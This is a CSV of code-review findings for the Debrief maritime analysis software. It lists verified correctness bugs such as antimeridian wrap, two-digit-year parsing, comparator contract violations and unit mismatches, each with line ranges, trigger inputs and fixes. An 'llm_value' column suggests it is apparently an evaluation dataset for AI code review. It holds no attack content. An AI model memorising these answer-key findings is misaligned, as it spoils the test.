id,slice,plugin,package,class,file_path,category,issue_type,severity,confidence,status,title,description,instances,trigger_input,suggested_fix,effort,llm_value,related,github_issue
CR-024,A5,org.mwc.cmap.legacy,MWC.Algorithms.EarthModels,FlatEarth,org.mwc.cmap.legacy/src/MWC/Algorithms/EarthModels/FlatEarth.java,algorithm-correctness,degenerate-input,High,High,verified,Default earth model does not wrap longitude across the antimeridian,"subtract() forms DELTA_LONG = LONG2 - LONG1 with no normalisation to [-pi,pi], and add() writes NEW_LONG without wrapping to [-180,180]. FlatEarth is the lazily-installed default model in WorldLocation, so every rangeFrom/bearingFrom crossing 180 deg longitude goes the long way round. Verified by compiling: rangeFrom((0,179.9E),(0,179.9W)) = 359.8 deg instead of 0.2 deg, bearing reversed. CompletelyFlatEarth (L195-L202) has the same defect.",L206-L213; L216-L228; L136-L141,".rep track with consecutive fixes at 179.95E and 179.95W: leg length, speed-over-ground, range/bearing tote and TMA solutions computed from these fixes are wrong by ~360 deg of arc; fit-to-window covers the whole globe.","Normalise DELTA_LONG to (-pi,pi] in subtract() (e.g. Math.atan2(sin,cos) or add/subtract 2pi) and wrap NEW_LONG in add(); mirror in CompletelyFlatEarth.",S,The invariant (longitude is cyclic) is domain knowledge; the arithmetic is otherwise well formed so no static rule flags it.,CompletelyFlatEarth L195-L202,
CR-025,A5,org.mwc.cmap.legacy,MWC.GenericData,WorldLocation,org.mwc.cmap.legacy/src/MWC/GenericData/WorldLocation.java,algorithm-correctness,unit-mismatch,High,High,verified,perpendicularDistanceBetween ignores cos(lat): cross-track distance wrong,"perpendicularDistanceBetween/rangeFrom(lineStart,lineEnd) builds Point2D from raw (long,lat) degrees and returns the Euclidean distance as WorldDistance.DEGS, so a longitude degree is weighted like a latitude degree regardless of latitude, and the result ignores the configured EarthModel. Verified by compiling the class: at 60N a point 1 deg of longitude east of a N-S segment reports 60.0 nm off-track where the true separation (same class, rangeFrom) is 30.0 nm; error is a factor 1/cos(lat) in the cross-track direction. Consumers include org.mwc.cmap.xyplot LocationCalculator (cross-track xy plots), SensorContactWrapper bearing-line hit testing and PolygonShape.",L281-L303; L625-L633; L692-L694,"Track at 60N, LocationCalculator cross-track distance of a fix 1 deg longitude off a north-south leg: reports 60 nm instead of 30 nm.","Scale x by cos(mean latitude) before the segment projection (or project via the EarthModel / rangeFrom with a great-circle cross-track formula) and only accept the inline test after switching it away from CompletelyFlatEarth, which currently masks the error.",S,Requires knowing that WorldDistance.DEGS means degrees of arc along a great circle (as returned by rangeFrom) while the code mixes it with a Euclidean degree distance; the inline test passes because it forces CompletelyFlatEarth.,-,
CR-026,A5+A9,org.mwc.cmap.legacy,MWC.Utilities.TextFormatting,DebriefFormatDateTime,org.mwc.cmap.legacy/src/MWC/Utilities/TextFormatting/DebriefFormatDateTime.java,algorithm-correctness,time-handling,High,High,verified,Two-digit-year export/parse window and negative-epoch formatting corrupt DTGs,"toString/toStringHiRes emit yyMMdd (two-digit year) and parseThis parses two-digit years with SimpleDateFormat's default pivot (now-80y .. now+20y), so any DTG outside that moving window is silently rewritten on a write/read round trip and the result depends on the machine date. Verified by compiling: 1945-01-01 -> ""450101 000000"" -> 2045-01-01; 2050-01-01 -> ""500101 000000"" -> 1950-01-01. Separately, for pre-1970 instants theVal % 1000 > 0 and micros % 1000 > 0 are false for negative remainders and wholeSeconds truncates toward zero, so 1969-12-31 23:59:59.500 is written as ""700101 000000"" and ""691231 235959"" (millis dropped). || parseThis picks TWO_DIGIT_YEAR_FORMAT ('yyMMdd HHmmss') whenever the date token is 6 digits. SimpleDateFormat maps yy into the window [now-80y, now+20y] fixed when the static formatter was created. Verified on 2026-09-23: '450101' -> 2045 but '470101' -> 1947; in 2028 the same file's '470101' flips to 2047. Historical REP data from before 1946 is already mis-dated, and any file with dates more than 20 years ahead silently lands a century early; nothing warns the user.",L151-L153; L186-L187; L255-L259; L319-L337; L346-L379; L252-L259,Export a historical (WWII) or long-range planning track to .rep or to any XML attribute written via toStringHiRes and re-import it: all fixes move by 100 years.,"Write four-digit years (yyyyMMdd) everywhere and, when parsing yy, call set2DigitYearStart with a fixed epoch documented in the format spec; use Math.floorMod/floorDiv for the sub-second arithmetic.",M,Needs knowledge of SimpleDateFormat's date-dependent two-digit-year pivot and of Java's sign-preserving % operator; the code reads as correct.,Debrief.ReaderWriter.Replay export,
CR-027,A6,org.mwc.debrief.legacy,Debrief.Wrappers,SensorContactWrapper,org.mwc.debrief.legacy/src/Debrief/Wrappers/SensorContactWrapper.java,bug,silent-data-loss,High,High,verified,compareTo returns 1 for equal-time cuts; TreeSet remove silently fails,"compareTo() returns 1 whenever DTGs are equal and the object is not the same instance (and when _DTG is null). This violates the Comparable contract, so once the TreeSet rebalances, TreeSet.remove()/contains() navigate past equal-time siblings and fail (verified: 4 equal-time items, remove of the first returns false while the item remains in the set). TacticalDataWrapper.removeElement ignores the boolean result, so deleting such a cut silently does nothing while the UI reports success. Same pattern in TMAContactWrapper L573-L599 and DynamicTrackShapes.DynamicTrackShapeWrapper L199-L225.",L736-L762; TacticalDataWrapper L828,"REP/DPF sensor with three or more cuts sharing one DTG (e.g. multi-target sonar at the same second), then delete one of them from the Outline view","Break ties deterministically (e.g. by identityHashCode or an insertion sequence number stored in the cut) so compareTo is antisymmetric and transitive, or switch the container to a list keyed by time.",M,Requires understanding red-black tree navigation with a non-antisymmetric comparator; the code comments assert the opposite of what happens.,TMAContactWrapper L573-L599; DynamicTrackShapeWrapper L199-L225,
CR-028,A6,org.mwc.debrief.legacy,Debrief.Wrappers,TMAWrapper,org.mwc.debrief.legacy/src/Debrief/Wrappers/TMAWrapper.java,algorithm-correctness,angle-wrap,High,High,verified,createItem interpolates radians against a 180-degree wrap threshold,"TMAContactWrapper.getCourse()/getBearingRads() return radians, but LinearInterpolator.interp's wrap check compares the difference with 180, so a course change from 350 to 10 degrees is interpolated the long way (midpoint 180 degrees, verified) and then converted with Rads2Degs. Resampled TMA solutions get wrong target course and wrong bearing for range/bearing-defined solutions.",L505; L529,"TMA solution whose consecutive entries have courses 350 and 010 (or bearings either side of north), then 'Resample data at' on the TMA layer",Interpolate in degrees (_targetCourseDegs) or convert to degrees before calling interp; add a unit test crossing north.,S,Needs the unit of getCourse() on TMAContactWrapper and the threshold inside a helper in another class; not grep-able.,-,
CR-029,A6,org.mwc.debrief.legacy,Debrief.Wrappers,TacticalDataWrapper,org.mwc.debrief.legacy/src/Debrief/Wrappers/TacticalDataWrapper.java,algorithm-correctness,angle-wrap,High,High,verified,"LinearInterpolator applies 360-degree wrap to range, frequency and depth","LinearInterpolator.interp() unconditionally treats any pair whose difference exceeds 180 as an angle and subtracts 360 from values above 180. It is used by SensorWrapper.createItem for range (yards/metres) and frequency (Hz) and by TMAWrapper.createItem for depth, speed, minima/maxima, so resampling sensor or TMA data with ranges like 100->5000 yds or frequencies like 150->400 Hz produces silently wrong interpolated values (verified: 100..5000 midpoint = 2370 instead of 2550). Also _timeDelta==0 (two cuts at the same DTG, which compareTo allows) gives an Infinity gradient.",L119; L125-L140; SensorWrapper L1052; SensorWrapper L1060-L1064; TMAWrapper L507,"Sensor with ranged cuts (e.g. 100 yds then 5000 yds) or frequency data spanning >180 Hz, then set 'Resample data at' on the sensor",Add a separate interpAngle() for bearings/orientation and keep interp() purely linear; guard _timeDelta==0.,S,Only visible by reading which quantities the shared interpolator is applied to; each call site looks correct in isolation.,-,
CR-030,A6,org.mwc.debrief.legacy,Debrief.Wrappers.Track,TrackSegment,org.mwc.debrief.legacy/src/Debrief/Wrappers/Track/TrackSegment.java,algorithm-correctness,unit-mismatch,High,High,verified,decimateRelativeTMA passes millis to HiResDate micros constructor,"decimateRelativeTMA receives theStartTime in milliseconds (startMicros = theStartTime*1000L at L751 confirms this) but then constructs new HiResDate(0, theStartTime), whose second argument is microseconds, so startDTG is 1000x too early (1970-era). The RelativeTMASegment offset recomputation via interpolateFix/getNearestTo therefore uses a bogus time, and the leg is renamed with a 1970 DTG via sortOutDateLabel. Reached from TrackWrapper.setResampleDataAt -> seg.decimate -> decimateRelative for CoreTMASegment legs.",L751; L760; L779,"Track whose first leg is a RelativeTMASegment, set 'Resample data at' on the parent track in the Properties view",Use new HiResDate(theStartTime) (millis constructor) or pass startMicros; add a unit test for resampling a relative TMA leg that checks the leg name/offset.,S,"Requires tracing the millis/micros convention of theStartTime across three methods and knowing the HiResDate(long,long) signature.",-,
CR-031,A6,org.mwc.debrief.legacy,Debrief.Wrappers.Track,TrackSegment,org.mwc.debrief.legacy/src/Debrief/Wrappers/Track/TrackSegment.java,bug,silent-data-loss,High,High,verified,Equal-start segments silently dropped by SegmentList (compareTo by startDTG),"TrackSegment.compareTo orders solely by startDTG(), and SegmentList (a ConcurrentSkipListSet via Plottables) ignores the boolean from add(), so a second segment whose first fix has the same DTG as an existing segment is silently discarded (verified with ConcurrentSkipListSet: second add returns false). startDTG() is also a mutable key: adding an earlier fix to a segment already in the set (TrackWrapper.addFix always appends to last()) or trimTo() can reorder keys without re-sorting, after which removeElement/first()/last() may target the wrong segment.",L634-L661; TrackWrapper_Support L288-L305; TrackWrapper L1056,"Generate a second TMA leg from cuts starting at the same DTG as an existing leg, or group/merge two tracks whose legs start at the same second",Check the result of super.add() in SegmentList.addSegment and either reject with a message or break ties (name/identity); remove and re-add a segment whenever its start time changes.,M,"Requires linking the comparator, the skip-list container semantics in Plottables and the mutable-key mutation paths.",-,
CR-032,A6,org.mwc.debrief.legacy,Debrief.Wrappers,TrackWrapper,org.mwc.debrief.legacy/src/Debrief/Wrappers/TrackWrapper.java,algorithm-correctness,division-by-zero,High,High,verified,calcCourseSpeed sub-second gaps give Infinity; setResampleDataAt divides by 0,"calcCourseSpeed() computes timeDifference as (micros delta)/1000000 in long arithmetic, so any gap under 1 s becomes 0 and distance/0 yields Infinity (or NaN) which is written into every fix via setSpeed; gaps of 1.9 s are treated as 1 s, inflating speed by up to 2x. 'Calc Course & Speed' is a top-level track menu action, so the wrong speeds are silently persisted and feed TMA/DR reconstruction. Separately, setResampleDataAt computes currentStart / interval (L3360) before the <=0 guard (L3371); the TimeFrequencyPropertyEditor 'None' tag is 0 micros, so selecting it throws ArithmeticException (SensorWrapper.setResampleDataAt guards this correctly); the same method also passes a millis startTime (L3366) to TacticalDataWrapper.decimate which expects micros (harmless only because max() discards it).",L1209; L1212; L3357-L3371; L3366; L3390-L3395,"Track with 1 Hz-or-faster fixes (e.g. NMEA/AIS at 0.5 s, or jittered 0.9 s), then Track > Calc Course & Speed; or select 'None' in the track's 'Resample data at' property","Compute the delta as a double in seconds (micros/1e6d), skip or merge fixes with zero delta, and guard against non-finite results before setSpeed; move the <=0 interval check above the division and pass micros to decimate.",S,Needs reasoning about integer vs floating division and the microsecond units of HiResDate; a grep for '/ 1000000' cannot tell which divisions are integer.,-,
CR-033,A7,org.mwc.debrief.track_shift,org.mwc.debrief.track_shift.ambiguity,AmbiguityResolver,org.mwc.debrief.track_shift/src/org/mwc/debrief/track_shift/ambiguity/AmbiguityResolver.java,algorithm-correctness,angle-wrap,High,High,verified,Domain fold subtracts 180 instead of 360; PermScore folds only once,"In sliceSensorIntoLegsUsingAmbiguity the ambiguous-minus-core delta step is folded with 'valueDelta -= 180d' for the >180 case but '+= 360d' for the <-180 case. A 360-domain jump of +350 becomes +170 instead of -10, giving a huge gapRate that exceeds minZig and falsely ends the current leg / starts a zig (python: 350->170, correct -10; 190->10, correct -170). Separately PermScore (L135-L140) folds the difference of two unwrapped curve values only once, so differences beyond +/-540 are mis-scored.",L1213-L1217; L135-L140,"Towed-array cut pair on a steady leg where (ambig-core) delta moves from -175 to +178 (domain flip) while thisLeg != null: valueDelta=353 -> 173 deg, gapRate>0.5 deg/s -> spurious zig.",Use 'valueDelta -= 360d' (or a shared shortAngle() helper) and make PermScore fold with a while loop or ((x+180)%360+360)%360-180.,S,Only visible by checking the two branches of the fold are symmetric and by reasoning about the unwrapped-domain range of curve outputs.,-,
